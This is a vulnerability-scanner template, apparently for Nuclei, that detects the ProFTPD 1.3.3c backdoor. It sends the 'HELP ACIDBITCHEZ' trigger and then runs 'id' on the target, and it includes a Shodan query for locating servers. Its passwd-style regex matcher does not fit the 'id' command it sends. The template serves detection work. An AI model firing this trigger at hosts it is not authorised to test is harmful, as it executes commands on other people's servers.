id: proftpd-backdoor
info:
  author: pussycat0x
  description: 'This backdoor was present in the proftpd-1.3.3c.

    '
  metadata:
    max-request: 1
    shodan-query: product:"ProFTPD"
  name: ProFTPd-1.3.3c - Backdoor Command Execution
  reference:
  - https://github.com/shafdo/ProFTPD-1.3.3c-Backdoor_Command_Execution_Automated_Script/blob/main/README.md
  - https://www.rapid7.com/db/modules/exploit/unix/ftp/proftpd_133c_backdoor/
  severity: critical
  tags: js,network,proftpd,ftp,backdoor
javascript:
- args:
    Host: '{{Host}}'
    Port: 21
  code: "const data = [\"HELP ACIDBITCHEZ\\n\", \"id\"];\nconst c = require(\"nuclei/net\"\
    );\nlet conn = c.Open('tcp', `${Host}:${Port}`);\nlet resp = conn.RecvFullString();\n\
    if (resp.includes(\"ProFTPD 1.3.3c\"))\n{\n  for (let i = 0; i < data.length;\
    \ i++)\n    {\n    conn.Send(data[i]);\n    console.log('Sending:', data[i]);\n\
    \    let resp = conn.RecvFullString();\n    resp\n}\n  } else\n  {\nexit();\n\
    \  }\n"
  matchers:
  - dsl:
    - success == true
    type: dsl
  - regex:
    - 'root:.*:0:0:'
    type: regex
  pre-condition: 'isPortOpen(Host,Port);

    '
